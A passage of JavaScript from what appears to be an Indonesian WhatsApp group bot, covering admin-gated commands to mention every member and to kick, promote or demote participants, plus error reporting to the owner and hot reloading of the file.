reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
addCmd(command, 1, db_cmd)
break
case "hidetag":{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
}
addCmd(command, 1, db_cmd)
break
case "kick": {
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'promote':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return reply(`*Penggunaan*\n${prefix+command} @tag`)
await conn.groupParticipantsUpdate(from, [users], "promote").then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'demote':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return reply(`*Penggunaan*\n${prefix+command} @tag`)
await conn.groupParticipantsUpdate(from, [users], "demote")
}
addCmd(command, 1, db_cmd)
break
default:
}
} catch (err) {
conn.sendMessage(global.OwnerNumber + '@s.whatsapp.net', {text:`${util.format(err)}`})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})